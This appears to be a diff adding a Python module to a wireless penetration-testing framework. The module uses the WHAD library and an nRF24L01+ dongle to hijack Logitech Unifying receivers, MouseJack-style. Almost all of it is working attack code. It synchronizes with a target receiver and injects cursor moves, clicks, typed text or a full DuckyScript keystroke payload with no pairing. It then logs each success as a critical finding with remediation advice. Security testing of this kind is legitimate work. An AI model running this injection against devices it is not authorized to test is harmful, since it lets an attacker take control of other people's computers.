@@ -1,0 +1,466 @@
+"""
+Stage 19 — Logitech Unifying Python API
+
+Uses the WHAD Python Unifying connectors (whad.unifying.Mouse and
+whad.unifying.Keyboard) for high-fidelity injection with real synchronization
+feedback — unlike the S10 CLI path which is one-shot and fire-and-forget.
+
+  Mouse mode:
+    - Mouse.synchronize() — discover device's channel and verify sync
+    - Mouse.move(x, y)    — relative cursor movement
+    - Mouse.left_click()  — inject left button click
+    - Repeated N times per config.UNIFYING_MOUSE_MOVES
+
+  Keyboard mode:
+    - Keyboard.synchronize() — lock onto device channel
+    - Keyboard.send_text()   — inject arbitrary text string
+    - DuckyScript mode       — load and replay a .ducky script file
+
+Requires an RfStorm (nRF24L01+) dongle. The WHAD Unifying Python API
+operates at a lower level than the CLI tools and provides synchronization
+state feedback and explicit timing control.
+"""
+
+from __future__ import annotations
+
+import os
+import time
+
+from core.dongle import WhadDongle
+from core.models import Finding
+from core.db import insert_finding
+from core.logger import get_logger
+import config
+
+log = get_logger("s19_unifying_api")
+
+try:
+    from whad.unifying import Mouse as _UniMouse, Keyboard as _UniKeyboard
+    _UNIFYING_API_IMPORTABLE = True
+except ImportError:
+    _UniMouse = None       # type: ignore[assignment,misc]
+    _UniKeyboard = None    # type: ignore[assignment,misc]
+    _UNIFYING_API_IMPORTABLE = False
+
+
+# ── Entry point ───────────────────────────────────────────────────────────────
+
+def run(dongle: WhadDongle, engagement_id: str) -> None:
+    if not _UNIFYING_API_IMPORTABLE:
+        log.warning(
+            "[S19] whad.unifying Mouse/Keyboard API not importable — "
+            "install WHAD with Unifying support (pip install whad[unifying]). "
+            "Skipping."
+        )
+        return
+
+    if dongle.caps.device_type != "rfstorm":
+        log.warning(
+            "[S19] Unifying Python API works best with an RfStorm (nRF24L01+) dongle. "
+            f"Current device: {dongle.caps.device_type}. Continuing anyway — "
+            "synchronize() may fail if hardware is incompatible."
+        )
+
+    mode = _ask_mode()
+    if mode == "mouse":
+        _run_mouse(dongle, engagement_id)
+    elif mode == "keyboard":
+        _run_keyboard(dongle, engagement_id)
+    elif mode == "ducky":
+        _run_ducky(dongle, engagement_id)
+    else:
+        log.info("[S19] Aborted by operator.")
+
+
+# ── Mouse sub-mode ────────────────────────────────────────────────────────────
+
+def _run_mouse(dongle: WhadDongle, engagement_id: str) -> None:
+    """Connect as a Unifying mouse transmitter and inject movements + clicks."""
+    target_addr = _prompt_address("Mouse — enter Unifying receiver ESB address")
+    if not target_addr:
+        log.info("[S19][mouse] No address — aborted.")
+        return
+
+    steps = config.UNIFYING_MOUSE_MOVES
+    sync_timeout = config.UNIFYING_SYNC_TIMEOUT
+    synced = False
+    moves_sent = 0
+    clicks_sent = 0
+
+    log.info(
+        f"[S19][mouse] Synchronizing to {target_addr} "
+        f"(timeout={sync_timeout}s) ..."
+    )
+
+    try:
+        mouse = _UniMouse(dongle.device)
+        mouse.address = target_addr
+
+        try:
+            mouse.synchronize()
+            synced = True
+            log.info(f"[S19][mouse] Synchronized to {target_addr}.")
+        except Exception as exc:
+            log.warning(
+                f"[S19][mouse] synchronize() failed: {type(exc).__name__}: {exc}\n"
+                "  Device may be out of range or not active."
+            )
+            return
+
+        # Inject moves in a spiral pattern to make effect visible on screen
+        deltas = [(20, 0), (0, 20), (-20, 0), (0, -20), (10, 10)]
+        for i in range(steps):
+            dx, dy = deltas[i % len(deltas)]
+            try:
+                mouse.move(dx, dy)
+                moves_sent += 1
+                log.debug(f"[S19][mouse] move({dx}, {dy}) — {moves_sent}/{steps}")
+                time.sleep(0.1)
+            except Exception as exc:
+                log.debug(f"[S19][mouse] move error: {exc}")
+                break
+
+        # One left click at the end
+        try:
+            mouse.left_click()
+            clicks_sent = 1
+            log.info("[S19][mouse] Left click injected.")
+        except Exception as exc:
+            log.debug(f"[S19][mouse] left_click error: {exc}")
+
+    except Exception as exc:
+        log.warning(f"[S19][mouse] Mouse API init failed: {type(exc).__name__}: {exc}")
+        return
+    finally:
+        try:
+            mouse.stop()
+        except Exception:
+            pass
+
+    inject_ok = moves_sent > 0 or clicks_sent > 0
+    if inject_ok:
+        finding = Finding(
+            type="unifying_api_mouse_injection",
+            severity="critical",
+            target_addr=target_addr,
+            description=(
+                f"Logitech Unifying Mouse API injection succeeded against {target_addr}. "
+                f"{moves_sent} cursor movement(s) and {clicks_sent} click(s) were injected "
+                "via whad.unifying.Mouse after successful synchronize() — "
+                "no pairing or authentication required."
+            ),
+            remediation=(
+                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
+                "Unifying receivers cannot be patched against MouseJack at the RF layer."
+            ),
+            evidence={
+                "target_address": target_addr,
+                "method": "unifying_api_mouse",
+                "synchronized": synced,
+                "moves_injected": moves_sent,
+                "clicks_injected": clicks_sent,
+            },
+            engagement_id=engagement_id,
+        )
+        insert_finding(finding)
+        log.info(
+            f"FINDING [critical] unifying_api_mouse_injection: {target_addr} "
+            f"({moves_sent} moves, {clicks_sent} click)"
+        )
+
+    _print_mouse_summary(target_addr, synced, moves_sent, clicks_sent)
+
+
+# ── Keyboard sub-mode ─────────────────────────────────────────────────────────
+
+def _run_keyboard(dongle: WhadDongle, engagement_id: str) -> None:
+    """Synchronize as a Unifying keyboard transmitter and inject text."""
+    target_addr = _prompt_address("Keyboard — enter Unifying receiver ESB address")
+    if not target_addr:
+        log.info("[S19][keyboard] No address — aborted.")
+        return
+
+    text = config.UNIFYING_KBD_TEXT
+    locale = config.UNIFYING_LOCALE
+    sync_timeout = config.UNIFYING_SYNC_TIMEOUT
+    synced = False
+    inject_ok = False
+
+    log.info(
+        f"[S19][keyboard] Synchronizing to {target_addr} "
+        f"(timeout={sync_timeout}s) ..."
+    )
+
+    try:
+        keyboard = _UniKeyboard(dongle.device)
+        keyboard.address = target_addr
+        if hasattr(keyboard, "locale"):
+            keyboard.locale = locale
+
+        try:
+            keyboard.synchronize()
+            synced = True
+            log.info(f"[S19][keyboard] Synchronized to {target_addr}.")
+        except Exception as exc:
+            log.warning(
+                f"[S19][keyboard] synchronize() failed: {type(exc).__name__}: {exc}\n"
+                "  Device may be out of range or not active."
+            )
+            return
+
+        try:
+            keyboard.send_text(text)
+            inject_ok = True
+            log.info(f"[S19][keyboard] Text injected: {text!r} (locale={locale})")
+        except Exception as exc:
+            log.warning(f"[S19][keyboard] send_text() failed: {type(exc).__name__}: {exc}")
+
+    except Exception as exc:
+        log.warning(f"[S19][keyboard] Keyboard API init failed: {type(exc).__name__}: {exc}")
+        return
+    finally:
+        try:
+            keyboard.stop()
+        except Exception:
+            pass
+
+    if inject_ok:
+        finding = Finding(
+            type="unifying_api_keyboard_injection",
+            severity="critical",
+            target_addr=target_addr,
+            description=(
+                f"Logitech Unifying Keyboard API injection succeeded against {target_addr}. "
+                f"Text {text!r} was injected via whad.unifying.Keyboard.send_text() "
+                "after successful synchronize() — no pairing or authentication required."
+            ),
+            remediation=(
+                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
+                "Unifying receivers cannot be patched against MouseJack at the RF layer."
+            ),
+            evidence={
+                "target_address": target_addr,
+                "method": "unifying_api_keyboard",
+                "synchronized": synced,
+                "text_injected": text,
+                "locale": locale,
+            },
+            engagement_id=engagement_id,
+        )
+        insert_finding(finding)
+        log.info(
+            f"FINDING [critical] unifying_api_keyboard_injection: {target_addr}"
+        )
+
+    _print_keyboard_summary(target_addr, synced, inject_ok, text)
+
+
+# ── DuckyScript sub-mode ──────────────────────────────────────────────────────
+
+def _run_ducky(dongle: WhadDongle, engagement_id: str) -> None:
+    """Synchronize as Keyboard and replay a DuckyScript via Keyboard.send_key()."""
+    target_addr = _prompt_address("Ducky — enter Unifying receiver ESB address")
+    if not target_addr:
+        log.info("[S19][ducky] No address — aborted.")
+        return
+
+    script_path = config.UNIFYING_DUCKY_SCRIPT
+    if not script_path:
+        try:
+            script_path = input(
+                "  DuckyScript file path: "
+            ).strip()
+        except (KeyboardInterrupt, EOFError):
+            script_path = ""
+
+    if not script_path or not os.path.exists(script_path):
+        log.warning(
+            "[S19][ducky] DuckyScript file not specified or not found. "
+            "Set config.UNIFYING_DUCKY_SCRIPT."
+        )
+        return
+
+    locale = config.UNIFYING_LOCALE
+    synced = False
+    inject_ok = False
+    keys_sent = 0
+
+    log.info(
+        f"[S19][ducky] Synchronizing to {target_addr} for DuckyScript playback ..."
+    )
+
+    try:
+        keyboard = _UniKeyboard(dongle.device)
+        keyboard.address = target_addr
+        if hasattr(keyboard, "locale"):
+            keyboard.locale = locale
+
+        try:
+            keyboard.synchronize()
+            synced = True
+            log.info(f"[S19][ducky] Synchronized to {target_addr}.")
+        except Exception as exc:
+            log.warning(
+                f"[S19][ducky] synchronize() failed: {type(exc).__name__}: {exc}"
+            )
+            return
+
+        # Parse and replay DuckyScript
+        with open(script_path) as f:
+            lines = f.readlines()
+
+        for line in lines:
+            line = line.strip()
+            if not line or line.startswith("//") or line.startswith("#"):
+                continue
+            parts = line.split(None, 1)
+            cmd = parts[0].upper()
+            arg = parts[1] if len(parts) > 1 else ""
+
+            try:
+                if cmd == "STRING":
+                    keyboard.send_text(arg)
+                    keys_sent += len(arg)
+                    log.debug(f"[S19][ducky] STRING: {arg!r}")
+                elif cmd in ("ENTER", "RETURN"):
+                    keyboard.send_key("ENTER")
+                    keys_sent += 1
+                elif cmd == "DELAY":
+                    try:
+                        time.sleep(int(arg) / 1000.0)
+                    except ValueError:
+                        pass
+                elif cmd in ("WINDOWS", "GUI"):
+                    keyboard.send_key("WINDOWS", arg.upper() if arg else None)
+                    keys_sent += 1
+                elif cmd in ("CTRL", "CONTROL"):
+                    keyboard.send_key("CTRL", arg.upper() if arg else None)
+                    keys_sent += 1
+                elif cmd == "ALT":
+                    keyboard.send_key("ALT", arg.upper() if arg else None)
+                    keys_sent += 1
+                elif cmd == "SHIFT":
+                    keyboard.send_key("SHIFT", arg.upper() if arg else None)
+                    keys_sent += 1
+                elif cmd in ("TAB",):
+                    keyboard.send_key("TAB")
+                    keys_sent += 1
+                elif cmd in ("ESCAPE", "ESC"):
+                    keyboard.send_key("ESCAPE")
+                    keys_sent += 1
+                # Unknown command: skip silently
+            except Exception as exc:
+                log.debug(f"[S19][ducky] cmd {cmd!r}: {exc}")
+
+        inject_ok = keys_sent > 0
+
+    except Exception as exc:
+        log.warning(f"[S19][ducky] Keyboard API failed: {type(exc).__name__}: {exc}")
+        return
+    finally:
+        try:
+            keyboard.stop()
+        except Exception:
+            pass
+
+    if inject_ok:
+        finding = Finding(
+            type="unifying_api_ducky_injection",
+            severity="critical",
+            target_addr=target_addr,
+            description=(
+                f"DuckyScript playback via Unifying Keyboard API succeeded against "
+                f"{target_addr}. {keys_sent} keystroke(s) from "
+                f"{os.path.basename(script_path)!r} were injected after "
+                "successful synchronize() — no pairing required."
+            ),
+            remediation=(
+                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
+                "Unifying receivers cannot be patched against MouseJack at the RF layer."
+            ),
+            evidence={
+                "target_address": target_addr,
+                "method": "unifying_api_ducky",
+                "synchronized": synced,
+                "script_file": os.path.basename(script_path),
+                "keys_injected": keys_sent,
+                "locale": locale,
+            },
+            engagement_id=engagement_id,
+        )
+        insert_finding(finding)
+        log.info(
+            f"FINDING [critical] unifying_api_ducky_injection: {target_addr} "
+            f"({keys_sent} keys from {os.path.basename(script_path)!r})"
+        )
+
+    print("\n" + "─" * 76)
+    print("  STAGE 19 SUMMARY -- Unifying API / DuckyScript")
+    print("─" * 76)
+    print(f"  {'Target address':<22}: {target_addr}")
+    print(f"  {'Synchronized':<22}: {'yes' if synced else 'no'}")
+    print(f"  {'Script':<22}: {os.path.basename(script_path)}")
+    print(f"  {'Keys injected':<22}: {keys_sent}")
+    print("─" * 76 + "\n")
+
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+def _ask_mode() -> str:
+    print("\n  Stage 19 — Logitech Unifying Python API:")
+    print("    [M]  Mouse    — synchronize + inject cursor moves + click")
+    print("    [K]  Keyboard — synchronize + inject text string")
+    print("    [D]  Ducky    — synchronize + replay DuckyScript file")
+    print("    [S]  Skip")
+    while True:
+        try:
+            c = input("  Select [M/K/D/S]: ").strip().upper()
+        except (KeyboardInterrupt, EOFError):
+            return "skip"
+        if c == "M":
+            return "mouse"
+        if c == "K":
+            return "keyboard"
+        if c == "D":
+            return "ducky"
+        if c in ("S", ""):
+            return "skip"
+        print("  Please enter M, K, D, or S.")
+
+
+def _prompt_address(prompt: str) -> str | None:
+    print(f"\n  {prompt}")
+    print("  Format: XX:XX:XX:XX:XX (5-byte hex, e.g. 29:b9:81:2c:a4)")
+    try:
+        raw = input("  ESB address [empty to abort]: ").strip()
+    except (KeyboardInterrupt, EOFError):
+        return None
+    return raw.lower() if raw else None
+
+
+def _print_mouse_summary(
+    addr: str, synced: bool, moves: int, clicks: int
+) -> None:
+    print("\n" + "─" * 76)
+    print("  STAGE 19 SUMMARY -- Unifying API / Mouse Injection")
+    print("─" * 76)
+    print(f"  {'Target address':<22}: {addr}")
+    print(f"  {'Synchronized':<22}: {'yes' if synced else 'no'}")
+    print(f"  {'Moves injected':<22}: {moves}")
+    print(f"  {'Clicks injected':<22}: {clicks}")
+    result = "SUCCESS" if (moves > 0 or clicks > 0) else "FAILED"
+    print(f"  {'Result':<22}: {result}")
+    print("─" * 76 + "\n")
+
+
+def _print_keyboard_summary(
+    addr: str, synced: bool, inject_ok: bool, text: str
+) -> None:
+    print("\n" + "─" * 76)
+    print("  STAGE 19 SUMMARY -- Unifying API / Keyboard Injection")
+    print("─" * 76)
+    print(f"  {'Target address':<22}: {addr}")
+    print(f"  {'Synchronized':<22}: {'yes' if synced else 'no'}")
+    print(f"  {'Text injected':<22}: {text!r}")
+    print(f"  {'Result':<22}: {'SUCCESS' if inject_ok else 'FAILED'}")
+    print("─" * 76 + "\n")
